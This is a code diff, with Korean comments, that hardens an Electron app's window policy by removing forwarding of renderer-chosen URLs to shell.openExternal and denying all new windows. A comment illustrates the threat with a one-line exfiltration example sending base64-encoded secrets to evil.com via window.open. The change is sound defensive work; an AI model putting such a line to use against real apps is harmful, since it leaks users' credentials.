@@ -22,17 +22,6 @@ export interface WindowLike {
 export interface WindowPolicyOptions {
   /** renderer가 머물러도 되는 정확한 URL 목록 */
   readonly allowedUrls: readonly string[]
-  /** 외부 브라우저로 URL을 여는 함수 (electron shell.openExternal) */
-  readonly openExternal: (url: string) => void
-}
-
-/** https 스킴만 외부 브라우저로 넘긴다. */
-export function isExternalNavigationAllowed(url: string): boolean {
-  try {
-    return new URL(url).protocol === 'https:'
-  } catch {
-    return false
-  }
 }
 
 function normalize(url: string): string {
@@ -61,8 +50,14 @@ export function applyWindowPolicy(window: WindowLike, opts: WindowPolicyOptions)
     event.preventDefault()
   })
 
-  window.webContents.setWindowOpenHandler(({ url }) => {
-    if (isExternalNavigationAllowed(url)) opts.openExternal(url)
-    return { action: 'deny' }
-  })
+  // 새 창을 거부하는 데서 끝내고, URL을 OS 브라우저로 넘기지 않는다.
+  //
+  // renderer가 고른 URL을 shell.openExternal로 전달하면 그 자체가 유출 통로가
+  // 된다: 침해된 renderer가 window.open('https://evil.com/?d=' + btoa(secrets))
+  // 한 줄로 자격증명을 내보낼 수 있고, CSP는 이를 막지 못한다 — window.open을
+  // 덮는 디렉티브가 없다(navigate-to는 표준화되지 않았다).
+  //
+  // 지금 이 앱에는 정당한 외부 링크가 하나도 없다. 실제로 필요해지면
+  // 호스트 허용목록과 사용자 확인을 함께 붙여 의도적으로 열어야 한다.
+  window.webContents.setWindowOpenHandler(() => ({ action: 'deny' }))
 }
